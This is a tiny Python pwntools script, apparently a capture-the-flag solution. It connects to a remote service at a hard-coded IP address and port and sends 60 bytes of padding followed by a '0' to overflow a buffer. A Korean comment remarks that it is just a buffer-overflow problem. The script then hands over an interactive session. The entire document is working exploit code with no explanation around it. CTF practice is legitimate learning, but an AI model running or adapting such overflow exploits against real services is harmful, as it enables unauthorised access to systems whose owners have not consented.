from pwn import *
r = remote("159.223.166.39", 9007)
r.sendline(b"a"*60+ b"0");
#그냥 bof문제.....
r.interactive()